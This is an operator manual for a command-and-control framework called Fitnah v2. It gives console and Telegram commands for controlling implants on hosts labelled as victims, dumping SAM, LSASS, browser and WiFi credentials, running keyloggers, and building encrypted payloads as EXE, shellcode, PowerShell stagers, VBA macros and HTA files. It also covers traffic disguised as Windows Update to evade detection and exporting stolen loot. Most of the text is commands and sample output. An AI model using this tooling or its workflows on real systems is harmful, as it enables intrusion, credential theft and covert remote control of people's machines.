# Fitnah v2 — CLI & Operational Guide

This guide covers day-to-day operator commands and workflows.

## Starting the Framework

### Launch C2 Server

```bash
cd /path/to/fitnah
python fitnah.py
# or
python main.py
```

Expected output:

```
[kernel] started — 42 plugin(s) loaded  transport=telegram
[*] HTTP listener on 0.0.0.0:8888
[telegram] connected
[c2] waiting for implants...
```

### With Custom Config

```bash
FITNAH_CONFIG=config/prod.yaml python fitnah.py
```

### Headless Mode (No Interactive Console)

```bash
python run_headless.py &  # runs in background
tail -f logs/fitnah.log
```

---

## Console: Interactive CLI

Once the server starts, you can interact via console:

```
fitnah> 
```

### Session Management

#### List All Sessions

```
fitnah> sessions
[✓] 3 agents alive:
  • abc12345  victim-pc-01     DOMAIN\admin         (admin)   Windows 10 / x64    192.168.1.100
  • def67890  lab-vm-02        NT AUTHORITY\SYSTEM  (system)  Windows 11 / x64    10.0.0.50
  • ghi11111  server-2022      DOMAIN\admin         (admin)   Windows Server 2022 192.168.2.15
```

#### Show Specific Session

```
fitnah> sessions -i abc12345
Agent         : abc12345
Hostname      : victim-pc-01
Username      : DOMAIN\admin
OS            : Windows 10 (x64)
Privilege     : admin
IP            : 192.168.1.100
Transport     : telegram
Last Checkin  : 5 seconds ago
History       : 8 actions (last: powershell)

plugins_run:
  - screenshot (ok)
  - shell:whoami (ok)
  - powershell (error)
```

#### Kill Session

```
fitnah> sessions -k abc12345
[*] Marked abc12345 for removal
```

Agent receives `die` command and exits cleanly.

---

## Plugin System

### List Available Plugins

```
fitnah> plugins
Loaded plugins (42):
  [recon]
    • arp_scan          - ARP network reconnaissance
    • dns_enum          - DNS enumeration
    • network_info      - IP config, network interfaces
    • port_scan         - Scan ports on target
    • processes         - List running processes
    • screenshot        - Capture screen
    • sysinfo           - System information
    • users_enum        - Enumerate local users
    • wifi_creds        - Extract WiFi credentials
  [execution]
    • clipboard         - Read clipboard
    • dir_list          - List directory contents
    • keylogger         - Start keylogger
    • screenshot        - Screenshot capture
  [credentials]
    • browser_creds     - Dump browser credentials
    • clipboard         - Read clipboard
    • dump_sam          - Extract SAM hive
    • lsass_dump        - Create LSASS memory dump
    • vault_creds       - Read Windows Vault
    • wifi_creds        - Extract WiFi credentials
  ...
```

#### Search Plugins

```
fitnah> plugins -q sysinfo
[recon/sysinfo.py]
  Name        : sysinfo
  Category    : recon
  MITRE       : T1082 (System Information Discovery)
  Description : Collect system information (hostname, OS, AV, etc.)
  Author      : @author
  Version     : 1.0
```

#### Filter by Category

```
fitnah> plugins -c recon
[recon] 8 plugins:
  • arp_scan
  • dns_enum
  • network_info
  • port_scan
  • processes
  • sysinfo
  • users_enum
  • wifi_creds
```

### Run Plugin Against Agent

#### Basic Execution

```
fitnah> use sysinfo abc12345
[*] Running sysinfo on abc12345 (victim-pc-01)...
[✓] sysinfo completed (2.3s)

Output:
  Hostname      : victim-pc-01
  OS            : Windows 10 Pro 22H2
  Arch          : x64
  CPU           : Intel Core i7-8700K
  RAM           : 16 GB
  AV Detected   : [Windows Defender, Windows Firewall]
  PS Version    : 5.1
  Domain        : DOMAIN.LOCAL
```

#### Plugin with Parameters

Some plugins accept options:

```
fitnah> use port_scan abc12345
[!] Port scan has required parameters:
  • target (str)          - IP or hostname to scan
  • ports (str, optional) - Ports to scan (e.g., '22,80,443' or '1-1000')

fitnah> use port_scan abc12345 --target 192.168.1.1 --ports 22,80,443,3389
[*] Scanning 192.168.1.1:22,80,443,3389...
[✓] port_scan completed

Open ports:
  22   (SSH)
  80   (HTTP)
  443  (HTTPS)
  3389 (RDP)
```

#### Interactive Plugin Mode

For complex operations:

```
fitnah> use screenshot abc12345 --interactive
[*] Starting interactive mode for screenshot on abc12345
[screenshot abc12345]> run
[*] Capturing screenshot...
[✓] Screenshot saved to loot #1234

[screenshot abc12345]> info
Name        : screenshot
Parameters  : {}
Status      : ok
Result size : 256 KB

[screenshot abc12345]> exit
```

#### Saving Plugin Results to Loot

Plugins automatically save credentials/sensitive data:

```
fitnah> use dump_sam abc12345
[✓] dump_sam completed

[loot] saved to #5678:
  Kind  : credential
  Label : SAM hive dump
  Size  : 512 KB
```

---

## Builder Commands

### List Build Options

```
fitnah> builder --help
Builder — Payload Compilation

Usage:
  builder [--format FORMAT] [--arch ARCH] [--encrypt ENC] [--sleep S] [--jitter J]

Formats:
  exe         - Windows PE executable
  dll         - Windows DLL
  shellcode   - Raw shellcode (donut converted)
  ps1         - PowerShell stager
  vba         - VBA macro payload
  hta         - HTML Application

Architectures:
  x64         - 64-bit (default)
  x86         - 32-bit

Encryption:
  none        - No encryption (default, faster)
  xor         - XOR encoding (weak)
  aes-256-gcm - AES-256-GCM (strong, slower)

Beacon:
  --sleep N   - Base sleep interval (seconds) default: 15
  --jitter J  - Jitter percentage (0-100) default: 20
```

### Build EXE Payload

```
fitnah> builder --format exe --arch x64 --encrypt aes-256-gcm --sleep 10 --jitter 30
[*] Building x64 EXE (AES-256-GCM)...
[*] Compiling implant...
[*] Linking...
[*] Encrypting loader...
[✓] Build complete!

Output:  build/agent_20240115_143022_x64.exe
Size    : 256 KB
SHA256  : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g
```

### Build PowerShell Stager

```
fitnah> builder --format ps1
[✓] Build complete!
Output: build/agent_20240115_143022.ps1

# Usage on Windows:
# powershell -ExecutionPolicy Bypass -NoProfile -Command ". C:\agent.ps1"
```

### Build VBA Macro

```
fitnah> builder --format vba
[✓] Build complete!
Output: build/agent_20240115_143022.bas

# Import into Word/Excel macro editor (Alt+F11)
# Run Sub Auto_Open() to beacon
```

### Batch Build (Multiple Formats)

```
fitnah> builder --batch
[*] Building all formats (x64+x86, exe+shellcode+ps1)...
[✓] exe_x64      build/agent_x64.exe           (256 KB)
[✓] exe_x86      build/agent_x86.exe           (192 KB)
[✓] shellcode_x64 build/agent_x64.shellcode    (128 KB)
[✓] shellcode_x86 build/agent_x86.shellcode    (96 KB)
[✓] ps1          build/agent.ps1               (64 KB)
[✓] vba          build/agent.bas               (128 KB)
[✓] hta          build/agent.hta               (96 KB)
```

---

## Scheduler: Automated Tasks

### Schedule Plugin Execution

Run a plugin repeatedly at intervals:

```
fitnah> schedule --add
Scheduled Task Wizard

Name            : monitor-av
Agent           : abc12345
Plugin          : sysinfo
Interval        : 60           # seconds
Max runs        : 0            # 0 = infinite
Start time      : now          # or 'yyyy-mm-dd hh:mm:ss'

[*] Scheduled task created: monitor-av
    Runs every 60s on abc12345 → sysinfo
    Next run: 2024-01-15 14:45:30
```

### List Scheduled Tasks

```
fitnah> schedule --list
Scheduled tasks (5):

  ID  Name              Agent         Plugin           Interval  Status
  1   monitor-av        abc12345      sysinfo          60s       running (next: +45s)
  2   beacon-test       def67890      ping             30s       running (next: +15s)
  3   periodic-capture  abc12345      screenshot       300s      disabled
  4   check-av          ghi11111      dump_sam         3600s     running (next: +2345s)
  5   wifi-sweep        abc12345      wifi_creds       600s      paused
```

### Manage Tasks

```
fitnah> schedule --pause 1              # pause task by ID
fitnah> schedule --resume 1             # resume task
fitnah> schedule --remove 1             # delete task
fitnah> schedule --run 3                # execute immediately
```

---

## Loot Database: Search & Export

### Search Loot

```
fitnah> loot
Loot store summary:
  Credentials : 12 entries
  Files       : 8 entries
  Screenshots : 3 entries
  ──────────────
  Total       : 23 entries
```

#### By Kind

```
fitnah> loot --kind credential
[credential] 12 entries:

  #1    2024-01-15 14:22  abc12345  SAM hive dump             (512 KB)
  #2    2024-01-15 14:30  abc12345  LSASS memory dump         (384 MB)
  #3    2024-01-15 14:45  def67890  Browser cookies (Chrome)  (156 KB)
  #5    2024-01-15 15:00  abc12345  WiFi credentials          (2 KB)
  ...
```

#### By Agent

```
fitnah> loot --agent abc12345
[abc12345] 15 entries:
  #1    credential  SAM hive dump
  #2    credential  LSASS memory dump
  #4    file        c:\windows\system32\svchost.exe
  #8    screenshot  screen_1705334400.png
  ...
```

#### Filter by Timestamp

```
fitnah> loot --after "2024-01-15 14:00" --before "2024-01-15 16:00"
[filtered] 8 entries in time range
```

### Export Loot

```
fitnah> loot --export
[*] Exporting to export_20240115_143022.zip...
[✓] Export complete (256 MB)

Contents:
  export/
  ├── 001_SAM_hive.bin
  ├── 002_LSASS_dump.dmp
  ├── 003_cookies.db
  ├── 005_wifi_creds.txt
  └── manifest.json  (metadata)
```

#### Export Specific Kind

```
fitnah> loot --export --kind credential
[*] Exporting credentials only...
[✓] credential_export_20240115.zip (15 MB)
```

---

## Audit Log: Integrity & History

### View Audit Log

```
fitnah> audit
[audit] 142 entries

Recent actions:
  2024-01-15 15:42:30  [checkin]        abc12345  Agent checkin
  2024-01-15 15:42:15  [plugin_run]     abc12345  operator@exe  sysinfo  ok
  2024-01-15 15:41:30  [plugin_run]     abc12345  operator@exe  screenshot  ok
  2024-01-15 15:40:15  [session_event]  abc12345  new
  2024-01-15 15:39:45  [transport]      —         failover: telegram→discord
```

### Search Audit Log

```
fitnah> audit --query "dump_sam"
[audit] 3 matches:

  2024-01-15 13:22:10  operator@exe  abc12345  dump_sam  ok
  2024-01-15 13:45:30  operator@exe  def67890  dump_sam  error
  2024-01-15 14:00:20  operator@exe  abc12345  dump_sam  ok
```

### Integrity Verification

```
fitnah> audit --verify
[*] Verifying audit log integrity...
[✓] Audit log valid (142 entries, checksums verified)
[✓] No modifications detected
[✓] All sessions accounted for
```

---

## Profile Management

### Hot-Swap Profiles (HTTP Malleable Profile)

Profiles customize HTTP headers and traffic patterns:

```
fitnah> profile --list
Available profiles:
  • default      - Plain HTTP, no obfuscation
  • chrome       - Mimics Chrome browser traffic
  • firefox      - Mimics Firefox browser traffic
  • windows-update - Mimics Windows Update requests
  • slack        - Mimics Slack client
```

#### Switch Profile

```
fitnah> profile --set windows-update
[*] Switching to windows-update profile
    Headers will mimic: Windows Update client
    User-Agent: Windows-Update-Agent/10.0
    URI: /update?id=<agent_id>&v=1.0
```

#### Build with Profile

```
fitnah> builder --format exe --profile windows-update
[*] Building with windows-update profile...
[✓] Implant will use Windows Update headers
```

---

## Shell Command Execution

### Direct Shell Commands

```
fitnah> shell abc12345 whoami
[*] Executing: whoami
[✓] Output:
DOMAIN\admin
```

### PowerShell

```
fitnah> ps abc12345 Get-Process
[*] Executing (PowerShell):
Get-Process

[✓] Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id  SI ProcessName
----  ------    -----      ----- -----   ------     --  -- -----------
   42       9    13600      15200   100     0.12   1234   0  explorer
   28       6     2100       5300    45     0.03   5678   0  svchost
```

---

## File Operations

### Download from Agent

```
fitnah> download abc12345 C:\Users\admin\Desktop\secret.txt
[*] Downloading C:\Users\admin\Desktop\secret.txt...
[✓] Downloaded 2.3 KB
[*] Saved to loot #42
```

### Upload to Agent

```
fitnah> upload abc12345 ./payload.exe C:\Windows\Temp\payload.exe
[*] Staging payload.exe...
[*] Uploading to abc12345: C:\Windows\Temp\payload.exe
[✓] Upload complete (256 KB)
```

### List Remote Directory

```
fitnah> ls abc12345 C:\Users\admin\
Listing C:\Users\admin\:
  [D] Desktop
  [D] Documents
  [D] Downloads
  [-] secret.txt               2.3 KB   2024-01-15 10:30
  [-] config.json              1.1 KB   2024-01-14 15:22
  [-] passwords.xlsx          256 KB   2024-01-10 08:10
```

---

## Interactive Telegram UI

From Telegram app:

### Main Menu

```
🔴 Fitnah v2
─────────────────────
Active agents : 3
Transport     : telegram

[📡 Sessions] [💾 Loot]
[🔨 Builder]  [📊 Status]
[📶 Listeners]
```

Click **📡 Sessions** → see all agents

### Agent Control Panel

Click agent → see detailed menu:

```
victim-pc-01
─────────────────────
Agent   : abc12345
User    : DOMAIN\admin
OS      : Windows 10 (x64)
Priv    : admin
Last seen: 5s ago

[💻 Shell]      [🔍 Recon]
[🔑 Credentials][📁 Files]
[🔒 Persist]    [🌐 Pivot]
```

#### Shell Mode (Telegram)

1. Click **💻 Shell**
2. Send command text (e.g., `whoami`)
3. Output appears as next message
4. Returns to agent menu

#### Download (Telegram)

1. Click **📁 Files** → **⬇ Download**
2. Send file path (e.g., `C:\Windows\System32\drivers\etc\hosts`)
3. File downloaded and sent as Telegram document
4. Auto-saved to loot

#### Screenshot (Telegram)

1. Click **🔍 Recon** → **📸 Screenshot**
2. Screenshot sent as Telegram photo
3. Auto-saved to loot

---

## Keyboard Shortcuts (Console Mode)

```
Ctrl+C      - Stop plugin execution / clear current input
Ctrl+D      - Exit console (graceful shutdown)
Tab         - Autocomplete command or agent ID
↑/↓         - Command history navigation
```

---

## Batch Operations

Execute the same plugin on multiple agents:

```
fitnah> batch --plugin sysinfo --agents abc12345,def67890,ghi11111
[*] Executing sysinfo on 3 agents...
[✓] abc12345  (victim-pc-01)      completed in 2.1s
[✓] def67890  (lab-vm-02)         completed in 3.2s
[✓] ghi11111  (server-2022)       completed in 4.5s

Summary:
  ✓ 3 succeeded
  ✗ 0 failed
  Avg time: 3.3s
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "No sessions" | Wait for implant to beacon (check C2 URL and key) |
| Plugin timeout | Increase `task_timeout` in config or plugin params |
| Session disconnected | Check implant process running; network connectivity |
| Loot DB corrupted | Backup `data/loot.db` and reinitialize: `rm data/loot.db` |
| Telegram slow | Check network; increase `failover_threshold` or use Discord |
| Implant exits immediately | Verify C2 URL matches config; check agent key |

---

## Next Steps

- **Plugins**: See `README_PLUGINS.md` to write custom modules
- **Setup**: See `README_SETUP.md` for deployment
- **Advanced**: See `README_CTF_ADVANCED.md` and `README_HOSTILE.md`
